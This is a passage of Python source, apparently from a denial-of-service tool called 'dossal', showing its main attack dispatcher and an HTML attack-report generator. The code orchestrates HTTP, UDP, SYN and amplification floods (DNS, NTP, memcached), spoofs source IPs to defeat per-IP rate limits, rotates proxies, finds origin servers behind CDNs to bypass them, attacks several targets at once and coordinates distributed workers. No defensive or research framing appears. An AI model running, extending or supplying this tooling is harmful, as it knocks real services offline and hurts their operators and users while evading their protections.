        print("[auto-full] 4/5: 공격 시작...", file=sys.stderr)
        # v12.8 버그 수정: strategy를 args.mode에 실제로 적용
        # (이전: throwaway `modes` 변수만 생성, args.mode은 기본값 'http' 유지)
        args.mode = ",".join(strategy)
        # Enable adaptive mode
        _ADAPTIVE[0] = True
        print("[auto-full] 5/5: 적응형 공격 ON", file=sys.stderr)
        
        # (Attack will run normally below)
    
    # v6.0: 분산 공격 모드
    if args.dist_mode in ('coordinator', 'worker'):
        _DIST_MODE[0] = args.dist_mode
        _DIST_PORT[0] = args.dist_port
        
        if args.dist_mode == 'coordinator':
            print(f"[dist] starting coordinator on port {args.dist_port}", file=sys.stderr)
            # Run coordinator (blocks for duration)
            _dist_coordinator(args.dist_port, args.duration)
            import sys as _sys
            _sys.exit(0)
        elif args.dist_mode == 'worker':
            print(f"[dist] starting worker on port {args.dist_port}", file=sys.stderr)
            # Run worker (blocks for duration)
            _dist_worker(args.dist_port, args.duration)
            import sys as _sys
            _sys.exit(0)
    
    # Auto mode: probe target + always include L4 for max destruction
    # Combo presets
    COMBOS = {
        'web': 'raw,udp,syn',
        'full': 'raw,udp,syn,rst',
        'tls': 'httpsmp,h2,udp',
        'proto': 'grpcmp,h2,udp',
        'amplify': 'dns,icmp,ssdp,ntp,memcached',
        'super': 'raw,httpsmp,h2,h3mp,grpcmp,quic,udp,tcp,syn,synack,rst,fin,websocket,wsm,slowloris,dns,icmp,ssdp,ntp,memcached',
        # v5.0: CDN bypass presets
        'cdn': 'raw,httpsmp,h2,udp,syn',
    }
    if args.combo:
        args.mode = COMBOS[args.combo]
        print(f"[combo] {args.combo} -> {args.mode}", file=sys.stderr)
        # 슈퍼 모드: 최대 전력 + 스텔스 + 자동회복 + 무작위 지연
        if args.combo == 'super':
            if not args.threads:
                args.threads = 16
            if not args.stealth:
                args.stealth = True
            if not args.recovery:
                args.recovery = True
            if args.jitter == 0:
                args.jitter = 2.0
            if args.spoof == 0:
                args.spoof = 100
            print("[SUPER] 최대 전력 + 스텔스 + 자동회복 + 100 스푸핑 IP + 2ms 지연", file=sys.stderr)
    
    # v5.1: 자동 Origin Discovery
    # CDN IP만 있으면 자동으로 origin을 찾아 src-ips에 적용
    if not args.discover and not args.dry_run and not args.no_auto_discover:
        try:
            from urllib.parse import urlparse as _up_auto
            _host_auto = _up_auto(args.url).hostname or args.url
            # First, check if target is behind CDN
            import socket as _sock_auto
            _addrs_auto = _sock_auto.getaddrinfo(_host_auto, None, _sock_auto.AF_INET, _sock_auto.SOCK_STREAM)
            _cdn_count = sum(1 for a in _addrs_auto if _is_cdn_ip(a[4][0]))
            _total = len(_addrs_auto)
            if _total > 0 and _cdn_count == _total:
                # All IPs are CDN → auto discover origin
                print(f"[auto-discover] target behind CDN ({_cdn_count}/{_total} CDN IPs), scanning origin...", file=sys.stderr)
                _origin, _details = _discover_origin(_host_auto)
                if _origin:
                    print(f"[auto-discover] ✅ origin found: {_origin}", file=sys.stderr)
                    # Apply origin IPs as source IPs (if not already set)
                    if not args.spoof and not args.pool and not getattr(args, 'src_ips', None):
                        args.src_ips = ','.join(_origin)
                        print(f"[auto-discover] setting --src-ips={args.src_ips}", file=sys.stderr)
                    elif args.spoof:
                        print(f"[auto-discover] tip: also try --src-ips={','.join(_origin)}", file=sys.stderr)
                else:
                    print(f"[auto-discover] ⚠️ no non-CDN origin found, attacking CDN edge", file=sys.stderr)
        except Exception as _e:
            print(f"[auto-discover] skipped: {_e}", file=sys.stderr)
    
    # Dry-run: probe and predict, don't attack
    if args.dry_run:
        probe = auto_probe(args.url)
        n_procs = max(1, min(32, args.threads or 8))
        spoof_n = args.spoof if args.spoof > 0 else (100 if args.stealth else 1)
        # Predict RPS based on mode
        mode_pred = {
            'raw': 143000, 'httpsmp': 103000, 'h2': 45000,
            'http': 85000, 'udp': 378000, 'quic': 378000,
            'syn': 16000, 'fin': 16000, 'rst': 12000,
            'grpcmp': 12000, 'wsm': 771000,
        }
        modes = args.mode.split(',')
        total_rps = 0
        for m in modes:
            m = m.strip()
            total_rps += mode_pred.get(m, 50000)
        print(f"[dry-run] Target: {probe['host']}:{probe['port']} ({probe['scheme']})", file=sys.stderr)
        print(f"[dry-run] Modes: {args.mode}", file=sys.stderr)
        print(f"[dry-run] Threads: {n_procs}", file=sys.stderr)
        print(f"[dry-run] Spoofed IPs: {spoof_n}", file=sys.stderr)
        print(f"[dry-run] Stealth: {'ON' if args.stealth else 'OFF'}", file=sys.stderr)
        print(f"[dry-run] Recovery: {'ON' if args.recovery else 'OFF'}", file=sys.stderr)
        print(f"[dry-run] Predicted: ~{total_rps:,} RPS (combined)", file=sys.stderr)
        print(f"[dry-run] Per-IP limit bypass: {spoof_n} IPs × 1000 RPS = {spoof_n * 1000:,} RPS max", file=sys.stderr)
        print(f"[dry-run] NO ATTACK SENT - remove --dry-run to start", file=sys.stderr)
        import sys as _sys
        _sys.exit(0)

    # Initialize proxy
    if args.proxy:
        _PROXY[0] = args.proxy
        print(f"[proxy] routing through {args.proxy}", file=sys.stderr)
    
    # Initialize proxy pool (v5.0)
    if args.proxy_file:
        _PROXY_POOL = _load_proxy_pool(args.proxy_file)
        print(f"[proxy-pool] loaded {len(_PROXY_POOL)} proxies from {args.proxy_file}", file=sys.stderr)
        if len(_PROXY_POOL) > 0:
            print(f"[proxy-pool] first: {_PROXY_POOL[0]}, last: {_PROXY_POOL[-1]}", file=sys.stderr)
        _RECOVERY[0] = True  # Proxy pool implies auto-recovery
    
    # Initialize browser fingerprint (v5.0 Phase 2)
    _BROWSER[0] = args.browser
    _CACHE_BYPASS[0] = args.cache_bypass
    if args.browser != 'chrome' or args.cache_bypass:
        print(f"[spoof] browser={args.browser}, cache_bypass={args.cache_bypass}", file=sys.stderr)
    
    # v5.2: Adaptive attack
    _ADAPTIVE[0] = args.adaptive
    _ADAPTIVE_TARGET_MS[0] = args.adaptive_target
    if args.adaptive:
        print(f"[adaptive] ON, target={args.adaptive_target}ms, range={_ADAPTIVE_MIN[0]}x-{_ADAPTIVE_MAX[0]}x", file=sys.stderr)
    
    # v5.3: Multi-layer hybrid auto
    # auto 모드에서 L3/L4/L7 비율 자동 분배
    # L3(icmp/syn): CPU 20%, L4(udp/tcp): CPU 30%, L7(http/h2): CPU 50%
    # 대상이 L7을 방어하면 L4/L3으로 전환
    
    # Initialize source IP rotation / spoofing
    _RECOVERY[0] = args.recovery
    _JITTER[0] = args.jitter / 1000.0
    _ROTATE_INTERVAL[0] = args.rotate_interval
    if args.stealth:
        _SPOOF_MODE[0] = True
    
    if args.spoof > 0:
        # Generate spoofed IPs (unclaimed TEST-NET)
        _SRC_IPS[0] = _generate_spoof_ips(args.spoof)  # type: ignore
        _SPOOF_MODE[0] = True
        print(f"[spoof] {len(_SRC_IPS[0])} spoofed IPs generated (TEST-NET 203.0.113.0/24)", file=sys.stderr)
        if args.recovery:
            print(f"[recovery] enabled - will auto-replace IPs that get 429", file=sys.stderr)
    elif args.pool:
        # Load IPs from pool file
        try:
            with open(args.pool) as f:
                ips = [line.strip().split(':')[0] for line in f if line.strip()]
            _SRC_IPS[0] = ips  # type: ignore
            print(f"[pool] loaded {len(ips)} IPs from {args.pool}", file=sys.stderr)
        except Exception as e:
            print(f"[pool] error: {e}", file=sys.stderr)
    elif args.src_ips:
        if args.src_ips == 'auto':
            _SRC_IPS[0] = _detect_local_ips()  # type: ignore
        else:
            _SRC_IPS[0] = [ip.strip() for ip in args.src_ips.split(',') if ip.strip()]
        print(f"[src-ips] rotating {len(_SRC_IPS[0])} IPs: {_SRC_IPS[0]}", file=sys.stderr)

    if args.auto:
        probe = auto_probe(args.url)
        print(f"[auto] target: {probe['host']}:{probe['port']} ({probe['scheme']})", file=sys.stderr)
        print(f"[auto] detected: {', '.join(probe.get('protocols', ['?']))}", file=sys.stderr)
        auto_modes = probe.get('recommended', ['http'])
        
        # Smart mode selection based on detected protocols
        port = probe.get('port', 80)
        scheme = probe.get('scheme', 'http')
        
        # L7: strongest modes for HTTP/HTTPS targets
        if scheme in ('http', 'https'):
            for m in ['raw', 'httpsmp', 'h2mp']:
                if m not in auto_modes:
                    auto_modes.append(m)
        
        # L4: always add for maximum impact
        for l4 in ['udp', 'syn', 'rst']:
            if l4 not in auto_modes:
                auto_modes.append(l4)
        
        # Amplification: add for UDP-friendly targets
        # These work best when target has UDP service or is behind a proxy
        for amp in ['dns', 'icmp']:
            if amp not in auto_modes:
                auto_modes.append(amp)
        
        # Deduplicate, preserve order
        auto_modes = list(dict.fromkeys(auto_modes))
        print(f"[auto] using: {', '.join(auto_modes)} ({len(auto_modes)} modes)", file=sys.stderr)
        args.mode = ','.join(auto_modes)
        
        # Set per-mode optimal connections/threads for auto
        _AUTO_CONNS = {
            'http': 200, 'raw': 1, 'https': 50, 'httpsmp': 1, 'h2': 300, 'h2mp': 1,
            'grpc': 50, 'grpcmp': 1, 'udp': 1, 'quic': 1, 'syn': 1, 'rst': 1,
            'tcp': 1, 'wsm': 1, 'dns': 1, 'icmp': 1, 'ssdp': 1, 'ntp': 1, 'memcached': 1,
        }
        auto_conn_parts = [f"{m}={_AUTO_CONNS.get(m, 50)}" for m in auto_modes]
        if args.conns:
            args.conns = args.conns + ',' + ','.join(auto_conn_parts)
        else:
            args.conns = ','.join(auto_conn_parts)

    modes = list(dict.fromkeys(m.strip() for m in args.mode.split(",")))  # dedupe, preserve order
    for m in modes:
        if m not in WORKERS:
            print(f"Unknown mode: {m}. Available: {', '.join(WORKERS.keys())}", file=sys.stderr)
            sys.exit(1)

    # Intensity preset: overrides default 100 connections
    _INTENSITY = {"light": 10, "balanced": 50, "max": 400}
    if args.connections == 100:
        args.connections = _INTENSITY.get(args.intensity, 50)

    # UDP/QUIC: set process count from --threads
    global _UDP_NPROCS
    if args.threads:
        _UDP_NPROCS[0] = max(1, min(32, args.threads))
    else:
        _UDP_NPROCS[0] = 4  # default: 4 processes

    # Per-mode connection overrides
    mode_conns = {}
    if args.conns:
        for part in args.conns.split(','):
            if '=' in part:
                m, c = part.split('=', 1)
                mode_conns[m.strip()] = int(c.strip())

    stats = Stats()
    payload_size = args.payload_size

    async def _run_all():
        """공격 + 모니터링 + 리포트 전체 파이프라인."""
        sampler = None
        baseline_cpu = 0.0
        if args.impact:
            host, port = parse_ip_port(args.url)
            victim_pid = await _find_pid(port)
            if victim_pid:
                # Pre-attack baseline
                import psutil
                try:
                    _p = psutil.Process(victim_pid)
                    _p.cpu_percent(None)
                    await asyncio.sleep(0.5)
                    baseline_cpu = _p.cpu_percent(None)
                except Exception:
                    baseline_cpu = 0.0
                sampler = CpuSampler(victim_pid)
                await sampler.start()

        live_task = None
        if args.live:
            _live_start = None
            async def _live_printer():
                """실시간 RPS/PPS 출력 (1초 간격)."""
                nonlocal _live_start
                _live_start = asyncio.get_event_loop().time()
                last_req, last_pkt = 0, 0
                last_t = asyncio.get_event_loop().time()
                while True:
                    await asyncio.sleep(1)
                    now = asyncio.get_event_loop().time()
                    dt = now - last_t
                    rps = (stats.requests - last_req) / dt
                    pps = (stats.packets - last_pkt) / dt
                    elapsed = now - _live_start
                    remaining = max(0, args.duration - int(elapsed))
                    parts = [f"[{remaining}s] RPS={rps:,.0f}"]
                    if stats.ws_msgs: parts.append(f"WS={stats.ws_msgs:,}")
                    if stats.packets: parts.append(f"PPS={pps:,.0f}")
                    if stats.conns: parts.append(f"CONNS={stats.conns}")
                    parts.append(f"ERR={stats.errors}")
                    # v5.2: 적응형 상태 표시
                    if _ADAPTIVE[0]:
                        _mult = _ADAPTIVE_STATE['rps_mult']
                        _avg = _ADAPTIVE_STATE['avg_ms']
                        parts.append(f"ADAPT={_mult:.1f}x")
                        parts.append(f"MS={_avg:.0f}")
                    # v5.0: 프록시 풀 상태
                    if _PROXY_POOL:
                        parts.append(f"PROXY={len(_PROXY_POOL) - len(_PROXY_BLOCKED)}/{len(_PROXY_POOL)}")
                    if _BLOCKED_IPS:
                        parts.append(f"429_IP={len(_BLOCKED_IPS)}")
                        if _SRC_IPS[0]:
                            parts.append(f"ACTIVE={_active_ip_count()}/{len(_SRC_IPS[0])}")
                    print("  " + "  ".join(parts), flush=True)
                    last_req, last_pkt, last_t = stats.requests, stats.packets, now
            live_task = asyncio.create_task(_live_printer())

        if args.targets:
            # Multi-target: attack all targets simultaneously
            target_urls = [t.strip() for t in args.targets.split(',') if t.strip()]
            print(f"[multi] attacking {len(target_urls)} targets simultaneously", file=sys.stderr)
            # Split threads across targets
            per_target = max(1, args.threads // len(target_urls)) if args.threads else max(1, 8 // len(target_urls))
            tasks = []
            for i, turl in enumerate(target_urls):
                print(f"[multi] target {i+1}/{len(target_urls)}: {turl}", file=sys.stderr)
                tasks.append(run(modes, turl, args.connections, args.duration, stats, payload_size, args, mode_conns))
            # Reduce threads per target for multi-target
            if _UDP_NPROCS[0] > per_target:
                _UDP_NPROCS[0] = per_target
            await asyncio.gather(*tasks)
        else:
            await run(modes, args.url, args.connections, args.duration, stats, payload_size, args, mode_conns)
        if live_task:
            live_task.cancel()
        report = stats.report(modes, args.url if not args.targets else args.targets, args.connections, args.duration)
        if args.impact:
            report["impact"] = await impact_score(args.url, stats, args.duration, sampler, baseline_cpu)
        return report

    report = asyncio.run(_run_all())
    print(json.dumps(report, indent=2))
    
    # v7.0: AI 학습 데이터 저장
    # v13.0: --learn 또는 --auto-full이면 자동 저장
    if args.learn or args.auto_full:
        _save_learning_entry(
            url=args.url if not args.targets else args.targets,
            mode='+'.join(modes) if modes else 'auto',
            threads=args.threads or 8,
            rps=report.get('rps', 0),
            packets=report.get('packets', 0),
            errors=report.get('errors', 0),
            duration=args.duration,
        )
        tag = 'auto-full' if args.auto_full else 'learn'
        print(f"[{tag}] saved: RPS={report.get('rps', 0):,.0f}, mode={'+'.join(modes) if modes else 'auto'}", file=sys.stderr)
    
    if args.report:
        _generate_report(args.report, report, args)

def _generate_report(path, report, args):
    """HTML 공격 리포트 생성."""
    import datetime
    ts = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    rps = report.get("rps", 0)
    pps = report.get("pps", 0)
    conns = report.get("connections_made", 0)
    errors = report.get("errors", 0)
    duration = report.get("duration_s", 0)
    url = report.get("url", "?")
    ver = report.get("version", "?")
    modes = ", ".join(report.get("modes", []))
    byts = report.get("bytes", 0)
    bps = report.get("bps", 0)
    html = (
        "<!DOCTYPE html><html><head><meta charset='utf-8'>"
        "<title>dossal Report</title><style>"
        "body{font-family:system-ui;max-width:800px;margin:40px auto;padding:0 20px;background:#1a1a2e;color:#eee}"
        "h1{color:#e94560}.card{background:#16213e;border-radius:12px;padding:20px;margin:16px 0}"
        ".stat{display:inline-block;margin-right:30px}.val{font-size:2em;font-weight:bold;color:#fff;background:#e94560;padding:4px 12px;border-radius:8px}"
        "table{width:100%;border-collapse:collapse}th,td{padding:8px 12px;text-align:left;border-bottom:1px solid #333}th{color:#e94560}"
        "</style></head><body>"
        "<h1>\u26a1 dossal Attack Report</h1>"
        "<div class='card'>"
        f"<div class='stat'><div class='val'>{rps:,.0f}</div><div>RPS</div></div>"
        f"<div class='stat'><div class='val'>{pps:,.0f}</div><div>PPS</div></div>"
        f"<div class='stat'><div class='val'>{conns:,.0f}</div><div>Conns</div></div>"
        f"<div class='stat'><div class='val'>{errors:,.0f}</div><div>Errors</div></div>"
        f"<div class='stat'><div class='val'>{duration}s</div><div>Duration</div></div>"
        "</div>"
        f"<div class='card'><h3>Modes</h3><p>{modes}</p></div>"
        f"<div class='card'><h3>Performance</h3>"
        f"<div style='margin:8px 0'><span style='color:#e94560'>RPS</span> "
        f"<div style='background:#333;border-radius:4px;height:24px;overflow:hidden'>"
        f"<div style='background:#e94560;height:100%;width:{min(100, rps/1000):.1f}%;display:flex;align-items:center;padding-left:8px;font-size:12px'>{rps:,.0f}</div></div></div>"
        f"<div style='margin:8px 0'><span style='color:#0f3460'>PPS</span> "
        f"<div style='background:#333;border-radius:4px;height:24px;overflow:hidden'>"
        f"<div style='background:#0f3460;height:100%;width:{min(100, pps/5000):.1f}%;display:flex;align-items:center;padding-left:8px;font-size:12px'>{pps:,.0f}</div></div></div>"
        f"<div style='margin:8px 0'><span style='color:#533483'>Conns</span> "
        f"<div style='background:#333;border-radius:4px;height:24px;overflow:hidden'>"
        f"<div style='background:#533483;height:100%;width:{min(100, conns/500):.1f}%;display:flex;align-items:center;padding-left:8px;font-size:12px'>{conns:,.0f}</div></div></div>"
        f"</div>"
        f"<div class='card'><h3>Details</h3>"
        f"<p>Target: <code>{url}</code></p>"
        f"<p>Version: {ver}</p><p>Time: {ts}</p>"
        f"<p>Bytes: {byts:,}</p><p>BPS: {bps:,.0f}</p></div>"
        "</body></html>"
    )
    with open(path, "w") as f:
        f.write(html)
    print(f"\nReport: {path}")

if __name__ == "__main__":
    main()
